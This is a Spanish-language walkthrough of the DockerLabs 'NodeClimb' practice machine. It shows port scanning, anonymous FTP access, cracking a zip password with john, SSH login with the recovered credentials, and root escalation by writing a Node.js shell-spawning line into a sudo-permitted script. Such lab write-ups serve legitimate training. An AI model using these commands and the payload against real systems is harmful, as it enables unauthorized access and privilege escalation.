---
title: NodeClimb
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-05-30
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-nodeclimb/nodeclimb_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - ftp
  - ssh
  - password attacks
  - misconfigurations
  - sudo abuse
  - java script
  - information gathering
  - misconfiguration exploitation
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/nodeclimb:-$ ping -c 1 172.17.0.3
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.049 ms

--- 172.17.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.049/0.049/0.049/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/nodeclimb:-$ nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.3 -n -Pn -oG nmap1
Host: 172.17.0.3 ()	Status: Up
Host: 172.17.0.3 ()	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/nodeclimb:-$ nmap -sCV -vvv -p21,22 172.17.0.3 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 cd1f3b2dc40b9903e6a35c26f54b47ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIIJXdsH3BqdecsOrKH3q6AQI9zJxHexsJHT+Kam8R4WWmg8g0o7s75qwSx6YvfhFptiXDYcMT6hq7VNs4YnuUg=
|   256 a0d492f69bdb122b77b6b158e07056f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIEGiHc4ywr2G/gO3ihoB+r77LxHnCWOkdfc3n0BiZLQ
MAC Address: E2:9E:09:5F:D0:E6 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

---
## Misconfiguration Exploitation

Desde el contenedor puedo conectarme al servicio FTP alojado en el puerto por defecto. Ingreso utilizando el usuario `Anonymous`, sin proporcionar ninguna contraseña.

Dentro del directorio principal encuentro el archivo `secretitopicaron.zip`, el cual descargo.

```terminal
/home/kali/Documents/dockerlabs/nodeclimb:-$ ftp Anonymous@172.17.0.3 
Connected to 172.17.0.3.
Password: 
230 Login successful.

ftp> ls
-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
226 Directory send OK.

ftp> get secretitopicaron.zip
226 Transfer complete.

ftp> quit
221 Goodbye.
```

Al intentar descomprimir el contenido, el archivo zip solicita una contraseña.

```terminal
/home/kali/Documents/dockerlabs/nodeclimb:-$ unzip secretitopicaron.zip
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password:
```

Para resolver esto, genero un hash con zip2john y utilizo john para obtener la clave en texto plano. El valor revelado es `password1`.

```terminal
/home/kali/Documents/dockerlabs/nodeclimb:-$ zip2john secretitopicaron.zip > secretitopicaron.txt

/home/kali/Documents/dockerlabs/nodeclimb:-$ john secretitopicaron.txt
password1        (secretitopicaron.zip/password.txt)
```

Utilizando esa contraseña, accedo finalmente al contenido del zip, que contiene el archivo `password.txt`. Dentro del archivo encuentro las credenciales `mario`:`laKontraseñAmasmalotaHdelbarrioH`.

```terminal
/home/kali/Documents/dockerlabs/nodeclimb:-$ unzip secretitopicaron.zip
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password: password1
 extracting: password.txt

/home/kali/Documents/dockerlabs/nodeclimb:-$ cat password.txt
mario:laKontraseñAmasmalotaHdelbarrioH
```

Luego establezco conexión SSH con el usuario `mario` usando la contraseña obtenida. El acceso es exitoso, y consigo un shell como usuario local dentro del contenedor.

```terminal
/home/kali/Documents/dockerlabs/nodeclimb:-$ ssh mario@172.17.0.3
mario@172.17.0.3's password: laKontraseñAmasmalotaHdelbarrioH

mario@8f2026c76143:~$ id
uid=1000(mario) gid=1000(mario) groups=1000(mario),100(users)
```

---
## Privilege Escalation

```terminal
mario@8f2026c76143:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
mario:x:1000:1000:mario,,,:/home/mario:/bin/bash
```

Inspecciono los permisos disponibles mediante `sudo`, donde identifico que puede ejecutar el binario `/usr/bin/node` sobre el archivo `/home/mario/script.js` con privilegios de `root` y sin necesidad de contraseña.

```terminal
mario@8f2026c76143:~$ sudo -l
Matching Defaults entries for mario on 8f2026c76143:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 8f2026c76143:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

El archivo `script.js` es editable por el usuario actual `mario`, lo que permite introducir código malicioso.

```terminal
mario@8f2026c76143:~$ ls -alh script.js 
-rw-r--r-- 1 mario mario 0 Jul  5  2024 script.js
```

Para aprovechar esta configuración, sobrescribo el contenido con una línea en JavaScript que lanza una shell con privilegios elevados.

```terminal
mario@8f2026c76143:~$ echo 'require("child_process").spawn("/bin/bash", ["-p"], {stdio: "inherit"})' > script.js
```

Al ejecutar el script con `sudo`, se invoca `Node.js` como `root`, lo que devuelve una shell privilegiada directamente.

```terminal
mario@8f2026c76143:~$ sudo /usr/bin/node /home/mario/script.js

root@8f2026c76143:/home/mario# id
uid=0(root) gid=0(root) groups=0(root)
```
